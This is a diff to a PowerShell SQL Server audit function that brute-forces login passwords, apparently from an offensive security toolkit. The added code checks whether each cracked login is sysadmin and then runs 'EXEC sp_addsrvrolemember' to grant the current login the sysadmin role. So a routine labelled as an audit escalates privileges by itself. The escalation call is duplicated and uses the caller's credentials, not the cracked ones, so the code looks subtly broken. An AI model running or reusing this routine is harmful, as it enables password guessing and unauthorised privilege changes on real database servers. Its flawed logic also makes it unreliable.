@@ -8125,7 +8125,6 @@ Function Invoke-SQLAuditPrivCreateProcedure {
 # ---------------------------------------
 # Invoke-SQLAuditWeakLoginPw
 # ---------------------------------------
-# add seperate login fields to support fuzz
 # Author: Scott Sutherland
 Function Invoke-SQLAuditWeakLoginPw{
     [CmdletBinding()]
@@ -8343,7 +8342,7 @@ Function Invoke-SQLAuditWeakLoginPw{
             return
         }
 
-        # Iternate through logins
+        # Iternate through logins and perform dictionary attack
         Write-Verbose "$Instance - Performing dictionary attack..."
         $LoginList | Select-Object -Unique | 
         ForEach-Object {
@@ -8355,11 +8354,27 @@ Function Invoke-SQLAuditWeakLoginPw{
                 $TargetPassword = $_
                 
                 $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetPassword -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
-                if($TestPass){
-                    Write-Verbose "$Instance - Successful Login: User = $TargetLogin Password = $TargetPassword" 
+                if($TestPass){                    
+
+                    # Check if sysadmin
+                    $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetPassword -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+                    if($IsSysadmin -eq "Yes"){
+                        $SysadminStatus = "Sysadmin"
+                    }else{
+                        $SysadminStatus = "Not Sysadmin"
+                    }
+
+                    Write-Verbose "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetPassword" 
+
+                    # Add current user as sysadmin if login was successful
+                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
+
+
+                    # Add current user as sysadmin if login was successful
+                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
 
                     # Add record                    
-                    $Details = "The $TargetLogin is configured with the password $TargetPassword."
+                    $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetPassword."
                     $IsVulnerable = "Yes"
                     $IsExploitable = "Yes"
                     $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                                     
@@ -8371,17 +8386,29 @@ Function Invoke-SQLAuditWeakLoginPw{
             }
         }
 
-        # Test user as pass if set
+        # Test user as pass
         if(-not $NoUserAsPass){
             $LoginList | Select-Object -Unique | 
             ForEach-Object {
                 $TargetLogin = $_               
                 $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetLogin -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
                 if($TestPass){
-                    Write-Verbose "$Instance - Successful Login: User = $TargetLogin Password = $TargetLogin" 
+
+                    # Check if sysadmin
+                    $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetLogin -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+                    if($IsSysadmin -eq "Yes"){
+                        $SysadminStatus = "Sysadmin"
+                    }else{
+                        $SysadminStatus = "Not Sysadmin"
+                    }
+
+                    Write-Verbose "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetLogin"
+
+                    # Add current user as sysadmin if login was successful
+                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose                     
 
                     # Add record                    
-                    $Details = "The $TargetLogin is configured with the password $TargetLogin."
+                    $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetLogin."
                     $IsVulnerable = "Yes"
                     $IsExploitable = "Yes"
                     $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                                     
